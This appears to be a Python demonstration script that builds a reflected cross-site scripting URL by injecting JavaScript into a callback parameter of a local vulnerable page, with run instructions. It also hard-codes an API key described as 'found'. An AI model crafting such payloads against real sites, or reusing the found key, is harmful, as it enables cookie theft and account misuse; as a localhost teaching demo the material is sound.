
import urllib.parse

# The API key we found
AMZN_CDN_NET_KEY = "e8HsHe2REToFLgjY30NcldJ8SFTTEKtFUc7HrGXc"

# The malicious JavaScript payload we want to inject.
# This payload will execute after the legitimate `handleData` function call.
# It pops an alert box, but could be used to steal cookies, redirect the user, etc.
js_payload = "handleData);alert('XSS DEMONSTRATION! This could be malicious code.');("

# We need to URL-encode the payload to ensure it's transmitted correctly.
encoded_payload = urllib.parse.quote_plus(js_payload)

# This is the URL for the vulnerable client application, not the API.
# The payload is passed as a query parameter.
vulnerable_client_url = "http://localhost:8000/vulnerable_client/index.html"

# The final, crafted URL that the attacker would send to a victim.
malicious_url = f"{vulnerable_client_url}?malicious_callback={encoded_payload}"

print("---" + " XSS Attack Simulation" + " ---")
print("\nThis script has generated a malicious URL for demonstration purposes.")
print("When a user visits this URL, the client-side code will execute the injected script.")
print("\nCrafted Malicious URL:\n")
print(malicious_url)

print("\n---" + " How to Run the Simulation" + " ---")
print("1. Start the mock API server in one terminal:")
print("   python3 /home/qenmity/xss_demonstration/mock_api_server.py")
print("\n2. Start a simple web server for the client in another terminal:")
print("   python3 -m http.server -d /home/qenmity/xss_demonstration")
print("\n3. Open the crafted URL printed above in your web browser to see the XSS alert.")
